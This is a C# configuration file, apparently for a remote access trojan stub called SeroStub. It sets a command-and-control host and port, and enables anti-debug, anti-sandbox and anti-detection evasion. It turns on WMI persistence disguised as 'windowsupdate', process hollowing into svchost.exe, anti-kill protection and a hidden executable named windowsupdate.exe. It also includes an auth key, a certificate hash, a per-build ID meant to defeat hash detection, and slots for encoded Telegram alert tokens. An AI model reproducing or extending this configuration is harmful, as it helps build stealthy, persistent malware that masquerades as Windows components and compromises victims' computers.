namespace SeroStub;

internal static class Config
{
    public static readonly string[] Hosts = new[] { "localhost" };
    public const int Port = 2727;
    public const bool UseMutex = true;
    public const string MutexName = "Global\\45c1305de5c04c7e983c2d5d930cf996";

    public const bool AntiDebug = true;
    public const bool AntiVM = false;
    public const bool AntiDetect = true;
    public const bool AntiSandbox = true;
    public const bool BlockCis = true;

    public const bool PersistRegistry = false;
    public const bool PersistStartup = false;
    public const bool PersistTask = false;
    public const bool PersistWmi = true;
    public const string PersistName = "windowsupdate";

    public const bool AntiKill = true;
    public const bool EnableWatchdog = true;
    public const bool EnableHollowing = true;
    public const string HollowTarget = "svchost.exe";

    public const string AuthKey = "XbrUQWE1lZfTR4+Ho8LI73lW/1gjQiEq";
    public const string CertHash = "700A8415A26C242E4A77FC13CE862990AD2E754A988DB535291B7CCD1ACBB14C";

    // Unique per build — changes the compiled binary hash even with identical settings
    public const string BuildId = "1e5980603b024141bba633b66f3d5887";

    public const int ReconnectDelayMs = 5000;
    public const int HeartbeatIntervalMs = 3000;

    public const string ClientIdPrefix = "Spas";

    public const string HiddenFileName = "windowsupdate.exe";

    // Telegram notification (SFC64-encoded — never stored as plaintext in binary)
    public const bool TelegramEnabled = false;
    public static readonly byte[] TelegramTokenSfc   = new byte[] {  };
    public static readonly byte[] TelegramChatId1Sfc = new byte[] {  };
    public static readonly byte[] TelegramChatId2Sfc = new byte[] {  };
    public static readonly byte[] TelegramSfcSeed    = new byte[] { 78, 134, 103, 163, 8, 209, 80, 148, 243, 108, 109, 157, 224, 6, 200, 120, 98, 146, 12, 40, 102, 20, 3, 35, 97, 251, 45, 165, 249, 164, 46, 129 };
}
